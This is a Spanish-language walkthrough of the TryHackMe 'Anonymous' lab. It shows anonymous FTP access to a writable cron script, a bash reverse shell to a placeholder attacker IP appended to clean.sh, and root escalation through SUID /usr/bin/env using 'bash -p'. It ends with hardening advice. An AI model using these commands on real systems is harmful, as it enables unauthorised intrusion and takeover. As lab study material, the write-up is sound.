---
title: "Anonymous"
date: 2026-10-05
categories: [TryHackMe, Medium]
tags: [linux, ftp, anonymous ftp, vsftpd, writable file, cron, reverse shell, SUID, gtfobins, privilege escalation, misconfiguration, nmap, netcat, env]
image:
  path: /assets/img/THM/Anonymous/banner.webp
  lqip: "data:image/webp;base64,UklGRl4CAABXRUJQVlA4WAoAAAAQAAAAHwAAHwAAQUxQSBECAAABoGvbtmnbanPMeW3bVqTM9o1uualtvJfatm0boW3btrknerDXWed8QkRMADWdDwZgwTva0gO06949APjWGfiFZzz2yY8/fvLYGQs9WCs8bvPrqvn6ZoevFZj8hJRjyqXkFLP0xGRCjcCy3xSzauao35YRWvAsaShKJacUK1NuqLEYX2FuzG9KikX1U/x1jLOqx5WKpN8+ePq+6y48+9xLb3r4xa8lPWpNgfWKRY0L5w7w1Ow645SftY4AZq+UWH6dDRDatwvNPgBjP3oLwzNLJeooOnjnqGsdmKMZ+MAxikWzzGMsv2EMhqPvNZvx1jGeSPA8qJi0yAKBe7STgGeR3sP73uURPLypHHU9wRujt3TFAe02TLeO7NCrQLvPlJV1CAhUOjOAlX/qk3YQPlWWsh6YTaWjcvQFkj4JOF5rUpZeOX3tuK5ApxELjnr4b5WkV3GeuxUlKRVJ8Zs3X3j9y38lKSnqLnzg6Copx6TqHFORoo4iGFNyqZJUSk45F1WWPAXDeFyppfqpPIaBZ0nJbRO1CA8Yjym1RdTteMDcoB9KaYOoT/uYAYHjFKXSmoZ+nIYBzvX4vuSUpFRaKinrg2l4gMA+/SfpD0kxppxTjJKu74On2XX6Vvrnka1D5j3wn1r89/75YFR1eOjpvaNpHrftqsdee+3Rq7aNBXPUt+C8UdM8dZ0LRrOFYGAhGHUBAFZQOCAmAAAA8AIAnQEqIAAgAD7tcrFSqaakoqgIATAdiWkAAFx8KAAA/vFEgAA="
  alt: Anonymous writeup
---

Anonymous es una máquina Linux Medium de TryHackMe, pero no tiene exploit ni CVE — es una cadena de dos malas configuraciones. El login anónimo de **FTP** expone un **directorio `scripts` escribible por todo el mundo** que contiene un script de limpieza que un **cron** ejecuta de forma periódica; añadir una reverse shell a ese script y volver a subirlo da una shell como `namelessone`. Desde ahí, el **bit SUID en `/usr/bin/env`** es una ruta de una línea a root vía [GTFOBins](https://gtfobins.github.io/gtfobins/env/).

| Campo      | Detalles   |
|------------|------------|
| Plataforma | TryHackMe  |
| Dificultad | Medium     |
| SO         | Linux      |
| IP         | 10.130.138.78 |
| Fecha      | Octubre 2026 |

## Herramientas Usadas

| Herramienta | Descripción                                                              |
|-------------|--------------------------------------------------------------------------|
| nmap        | Escáner de puertos y fingerprinting de servicios                        |
| ftp         | Login anónimo; lectura de los scripts y subida del `clean.sh` modificado |
| netcat (nc) | Listener de la reverse shell                                            |
| env         | SUID `/usr/bin/env` abusado vía GTFOBins para la shell de root          |

## Reconocimiento y Enumeración

### Escaneo de Puertos

Un escaneo TCP completo con detección de servicios y scripts por defecto. `-p-` cubre los 65.535 puertos, `-sCV` lanza los scripts NSE por defecto más la detección de versiones, `--min-rate 5000` lo mantiene rápido, y `-Pn` salta el descubrimiento de host.

```bash
sudo nmap -p- -sCV --min-rate 5000 -Pn -n 10.130.138.78 -oN nmap
```

```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux
```

La salida de NSE hace casi toda la enumeración por nosotros: **el FTP anónimo está permitido**, y nmap marca el directorio `scripts` como **`[NSE: writeable]`** — un directorio escribible por todos (`drwxrwxrwx`) en un servidor FTP anónimo es una pista inmediata. SSH y Samba también están abiertos, pero el recurso FTP escribible es la vía de entrada obvia.

### FTP Anónimo

Entrando como `anonymous` (cualquier contraseña) y listando el directorio `scripts`:

```bash
ftp 10.130.138.78
# Name: anonymous   Password: (en blanco)
# 230 Login successful.
```

```bash
ftp> cd scripts
ftp> ls -la
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2064 Oct 05 09:46 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

Tres ficheros, todos propiedad del UID **1000** (un usuario real). Dos cosas destacan: `clean.sh` es **escribible por todos** (`-rwxr-xrwx`), y `removed_files.log` tiene una fecha de modificación **muy reciente** comparada con las fechas de 2020 de todo lo demás. Leer ambos explica por qué:

```bash
ftp> get clean.sh
ftp> get removed_files.log
```

```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

`clean.sh` es un script de limpieza de `/tmp`, y `removed_files.log` está lleno de líneas repetidas de "nothing to delete" con un timestamp que se actualiza constantemente. Ese patrón — un log que crece solo — significa que **`clean.sh` se está ejecutando automáticamente de forma periódica** (un cron job), como el usuario que lo posee (UID 1000). Y como el fichero es escribible por todos *y* podemos subir encima de él por FTP, controlamos qué ejecuta ese trabajo programado.

## Acceso Inicial — Script de Cron Escribible como `namelessone`

El plan es simple: añadir una reverse shell a `clean.sh`, subirlo de vuelta por FTP, y esperar a que el cron job lo ejecute. Añadimos una línea al final de la copia local:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' >> clean.sh
```

Arrancamos un listener, y luego empujamos el script modificado de vuelta al servidor (el directorio es escribible, así que `put` sobrescribe el original):

```bash
ftp> put clean.sh
# 226 Transfer complete.
```

```bash
nc -nlvp 4444
```

Dentro del intervalo del cron, el trabajo dispara nuestra línea añadida y conecta de vuelta:

```bash
Connection received on 10.130.138.78 45610
bash: cannot set terminal process group (7581): Inappropriate ioctl for device
namelessone@anonymous:~$ whoami
namelessone
```

Una shell como **`namelessone`** — el dueño UID-1000 del script. Tras el habitual tratamiento de la TTY (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, luego `stty raw -echo`), la flag de usuario está en el directorio home:

```bash
namelessone@anonymous:~$ cat user.txt
REDACTED
```

## Escalada de Privilegios — `namelessone` → `root` (SUID `env`)

Lo primero que hay que comprobar en una máquina así son los binarios SUID — ficheros que se ejecutan con los privilegios de su dueño sin importar quién los lance. Uno destaca de inmediato:

```bash
namelessone@anonymous:~$ find / -perm -4000 2>/dev/null
/usr/bin/env
```

**`/usr/bin/env` con el bit SUID puesto** es una mala configuración clásica. `env` está pensado para ejecutar un comando en un entorno modificado — pero con el bit SUID propiedad de root, podemos decirle que ejecute una shell, y el flag `-p` de `bash` mantiene los privilegios elevados (effective-root) en lugar de soltarlos. Esta es la técnica exacta de [GTFOBins](https://gtfobins.github.io/gtfobins/env/) para `env`:

```bash
namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/root.txt
REDACTED
```

Root en un solo comando.

## Flags

| Flag        | Valor      |
|-------------|------------|
| `user.txt`  | `REDACTED` |
| `root.txt`  | `REDACTED` |

## Conclusiones Clave

- **FTP anónimo más un directorio escribible es un foothold.** El login anónimo solo es de bajo riesgo cuando el recurso es estrictamente de solo lectura y no contiene nada sensible. Un directorio `scripts` escribible por todos convirtió el acceso de lectura en acceso de escritura, y el acceso de escritura en ejecución de código.
- **Un script programado que puedes editar es ejecución remota de código.** `clean.sh` corría automáticamente como su dueño, y el `removed_files.log` que crecía era la pista que delataba la programación. Cualquier fichero que un cron job ejecute debe ser escribible *solo* por root (o el usuario que lo corre) — la automatización escribible por todos es una invitación abierta.
- **Lee las migas de pan que te da la máquina.** El timestamp reciente de `removed_files.log` frente a sus vecinos con fecha de 2020 fue la única pista de que `clean.sh` estaba vivo. Los timestamps y el crecimiento de los logs son datos de enumeración, no ruido.
- **SUID en un binario de propósito general es game over.** `/usr/bin/env` nunca necesita el bit SUID; con él, GTFOBins lo convierte en una shell de root instantánea vía `-p`. Audita los binarios SUID con regularidad (`find / -perm -4000`) y quita el bit de todo lo que no lo requiera estrictamente.
